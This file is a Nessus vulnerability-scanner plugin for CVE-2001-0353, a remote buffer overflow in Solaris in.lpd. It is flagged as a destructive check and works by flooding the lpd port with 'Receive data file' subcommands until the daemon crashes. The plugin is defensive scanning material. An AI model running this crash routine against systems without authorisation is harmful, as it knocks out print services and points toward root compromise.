#
# (C) Tenable Network Security, Inc.
#

# This plugin was realized thanks to the help
# of the french "eXperts" working group - http://experts.securite.org
#

include("compat.inc");

if (description)
{
  script_id(10727);
  script_version("$Revision: 1.38 $");
  script_cvs_date("$Date: 2017/05/16 20:06:33 $");

  script_cve_id("CVE-2001-0353");
  script_bugtraq_id(2894);
  script_osvdb_id(1875);
  script_xref(name:"CERT-CC", value:"CA-2001-15");

  script_name(english:"Solaris in.lpd Transfer Job Routine Remote Buffer Overflow");
  script_summary(english:"Crashes the remote lpd");

  script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a buffer overflow vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote lpd daemon seems to be vulnerable to a buffer overflow when
sent too many 'Receive data file' commands. An attacker may use this
flaw to gain root on this host.");
  script_set_attribute(attribute:"solution", value:
"If the remote host is running Solaris, apply the relevant patch from
Sun.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2001/01/19");
  script_set_attribute(attribute:"plugin_publication_date", value:"2001/08/22");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2001-2017 Tenable Network Security, Inc.");
  script_family(english:"Gain a shell remotely");

  script_dependencies("find_service1.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/lpd", 515);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_kb_item("Services/lpd");
if(!port)port = 515;


timestamp = rand();


#
# LPRng is not vulnerable to this flaw
#
function is_lprng()
{
 local_var r, req, soc;

 soc = open_priv_sock_tcp(dport:port);
 if(!soc)
  exit(0);
 req = raw_string(9)+ string("lp") + raw_string(0x0A);
 send(socket:soc, data:req);
 r = recv(socket:soc, length:4096);
 close(soc);
 if("SPOOLCONTROL" >< r)return(1);
 return(0);
}

function printer_present(name)
{
 local_var r, req, soc;
 soc = open_priv_sock_tcp(dport:port);
 if(!soc)
  return(0);
 req = raw_string(0x04,name, 0x0A);
 send(socket:soc, data:req);
 r = recv(socket:soc, length:4096);
 if(egrep(pattern:"Your host does not have .*access", string:r))return(0);
 close(soc);
 if(strlen(r) > 1)
  return(1);
 return(0);
}


#
# More default names should be added here
#
function find_printer()
{
 if(printer_present(name:"NESSUS:CHECK"))return("NESSUS:CHECK");
 return(0);
}

function subcommand(num)
{
 local_var pad;
 if(num < 10)pad = "0";
 else pad = "";
 return(raw_string(0x03) +"0 " + string("dfA0", pad, num, "nessus_test_",timestamp) + raw_string(0x0A));
}

function ack()
{
 return(raw_string(0x00));
}


function abort_string()
{
 return(raw_string(0x01, 0x0A));
}


if(!get_port_state(port))exit(0);

if(is_lprng())
{
 exit(0);
}

printer = find_printer();
if(!printer)
{
 #display("No printer found\n");
 exit(0);
}

soc = open_priv_sock_tcp(dport:port);
if(soc)
{
 req = raw_string(0x02, printer, 0x0A);
 send(socket:soc, data:req);
 r = recv(socket:soc, length:1);
 if(r){
	exit(0);
	}
 flag = 0;
 for(i=0;i<400;i=i+1)
 {
 send(socket:soc, data:subcommand(num:i));
 send(socket:soc, data:ack());
 r = recv(socket:soc, length:2);
 if(flag)
 {
  if(!strlen(r)){
	if(i < 	100)exit(0);
	}
 }


 if(strlen(r)){
	flag = 1;
	#display(hex(r[0]), hex(r[1]), "\n");
	if(!(r == raw_string(0,0)))
	{
	#display("Abort\n");
	send(socket:soc, data:abort_string());
	r = recv(socket:soc, length:1);
	exit(0);
	}
      }
 }
 send(socket:soc, data:subcommand(num:i));
 send(socket:soc, data:ack());
 sleep(1);
 r = recv(socket:soc, length:4096);
 if(!r)security_hole(port);
 else
 {
 send(socket:soc, data:abort_string());
 r = recv(socket:soc, length:1);
 close(soc);
 }
}
